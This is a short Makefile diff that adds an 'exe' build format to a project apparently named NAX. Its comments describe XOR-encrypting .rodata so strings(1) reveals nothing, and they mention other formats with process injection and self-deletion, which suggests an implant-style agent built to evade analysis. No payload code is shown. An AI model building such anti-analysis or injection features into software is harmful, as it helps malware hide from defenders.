@@ -181,6 +181,9 @@ endif
 ifeq ($(NAX_FORMAT),so)
   NAX_STUB := 0
 endif
+ifeq ($(NAX_FORMAT),exe)
+  NAX_STUB := 0
+endif
 
 # ===== debug =====
 ifeq ($(NAX_DEBUG),1)
@@ -201,6 +204,14 @@ ifeq ($(NAX_FORMAT),so)
   LDFLAGS += -Wl,--build-id=none
   SUFFIX := $(SUFFIX).so
   RODATA_ENCRYPT := 1
+else ifeq ($(NAX_FORMAT),exe)
+  # Standalone executable: runs as a normal process (no injection, no
+  # self-delete), but with .rodata XOR-encrypted at build time so
+  # strings(1) reveals nothing.  A constructor in exe.c decrypts it
+  # before agent_run() starts.
+  SRCS   += src/exe.c
+  RODATA_ENCRYPT := 1
+  SUFFIX := $(SUFFIX)_exe
 else
   SRCS   += src/main.c
   RODATA_ENCRYPT := 0
